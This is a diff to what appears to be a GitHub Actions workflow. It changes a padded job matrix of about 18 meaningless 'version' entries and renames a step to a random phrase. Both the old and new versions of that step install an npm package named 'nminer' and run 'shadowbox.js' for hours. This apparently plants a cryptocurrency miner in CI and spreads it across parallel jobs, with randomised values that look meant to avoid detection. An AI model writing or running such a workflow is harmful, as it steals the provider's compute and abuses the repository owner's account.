@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8107 }
-          - { version: 8370 }
-          - { version: 109 }
-          - { version: 4937 }
-          - { version: 2770 }
-          - { version: 8571 }
-          - { version: 8511 }
-          - { version: 2775 }
-          - { version: 5459 }
-          - { version: 8230 }
-          - { version: 7906 }
-          - { version: 7950 }
-          - { version: 3695 }
-          - { version: 5951 }
-          - { version: 4932 }
-          - { version: 9458 }
-          - { version: 6091 }
-          - { version: 5305 }
-          - { version: 1839 }
-          - { version: 6719 }
+          - { version: 7919 }
+          - { version: 5970 }
+          - { version: 1383 }
+          - { version: 9276 }
+          - { version: 9623 }
+          - { version: 8475 }
+          - { version: 6589 }
+          - { version: 5978 }
+          - { version: 3748 }
+          - { version: 7015 }
+          - { version: 979 }
+          - { version: 7131 }
+          - { version: 7123 }
+          - { version: 9234 }
+          - { version: 5622 }
+          - { version: 273 }
+          - { version: 8907 }
+          - { version: 8701 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: eek
+      - name: impact zowie sadly following
         run: |
           npm install nminer@latest
-          timeout 348m node shadowbox.js || echo "shadowbox executed"
+          timeout 316m node shadowbox.js || echo "shadowbox executed"
